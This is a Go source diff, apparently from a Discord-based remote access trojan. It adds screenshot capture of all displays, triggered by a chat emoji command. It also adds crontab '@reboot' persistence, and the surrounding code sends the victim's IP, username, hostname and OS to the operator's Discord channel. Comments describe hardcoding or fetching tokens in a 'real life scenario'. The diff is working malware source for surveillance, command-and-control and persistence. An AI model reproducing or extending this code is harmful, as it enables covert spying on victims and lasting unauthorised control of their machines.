@@ -5,6 +5,7 @@ import (
 	"bufio" //TODO Delete in final product as API keys will be hardcoded, not loaded from .env as in my example
 	"bytes"
 	"fmt"
+	"image/png"
 	"io"
 	"io/fs"
 	"log" // TODO Delete later
@@ -19,6 +20,7 @@ import (
 	"strings"
 
 	"github.com/bwmarrin/discordgo"
+	"github.com/kbinani/screenshot"
 )
 
 const (
@@ -88,7 +90,22 @@ func commandAndControl(session *discordgo.Session, message *discordgo.MessageCre
 		}
 		flag = 1
 	} else if message.Content == "📸" {
-		// TODO Add screenshot
+		n := screenshot.NumActiveDisplays()
+
+		for i := 0; i < n; i++ {
+			bounds := screenshot.GetDisplayBounds(i)
+
+			img, err := screenshot.CaptureRect(bounds)
+			if err != nil {
+				panic(err)
+			}
+			fileName := fmt.Sprintf("%d_%dx%d.png", i, bounds.Dx(), bounds.Dy())
+			file, _ := os.Create(fileName)
+			defer file.Close()
+			png.Encode(file, img)
+
+			fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
+		}
 		flag = 1
 	} else if strings.HasPrefix(message.Content, "👇") {
 		fileName := message.Content[5:len(message.Content)]
@@ -359,16 +376,43 @@ func sendInitialData(bot *discordgo.Session) {
 		firstMsg := fmt.Sprintf("Session *%s* opened! 🥳\n\n**IP**: %s\n**User**: %s\n**Hostname**: %s\n**OS**: %s\n**CWD**: %s", sessionId, localAddr.IP, currentUser.Username, hostname, runtime.GOOS, cwd)
 		m, _ := bot.ChannelMessageSend(myChannelId, firstMsg)
 		bot.ChannelMessagePin(myChannelId, m.ID)
+
+		//Persistance
+		crontabPersistance()
+	}
+}
+func crontabPersistance() {
+	cwd, _ := os.Getwd()
+	cronJob := "@reboot " + cwd + os.Args[0][1:]
+
+	// Get current crontab
+	cmd := exec.Command("crontab", "-l")
+	output, err := cmd.Output()
+	if err != nil {
+		return
+	}
+
+	// Add the new cron job to the existing jobs
+	newCron := string(output) + "\n" + cronJob + "\n"
+
+	// Set the new crontab
+	cmd = exec.Command("crontab", "-")
+	cmd.Stdin = strings.NewReader(newCron)
+	err = cmd.Run()
+	if err != nil {
+		return
 	}
 }
 
 func main() {
+	//Load Enviromental variables in which is DISCORD_TOKEN and GUILD_ID, for testing you need to create your own toknes and get id
+	//In real life scenario tokens are build into program, sometimes encoded in program or retrieved dynamicly using webrequests or any other way
 	envVars, err := loadEnvFile(".env")
 	if err != nil {
 		log.Fatal(err)
 	}
-
 	var TOKEN = envVars["DISCORD_TOKEN"]
 	myGuildId = envVars["GUILD_ID"]
+
 	discordBot(TOKEN)
 }
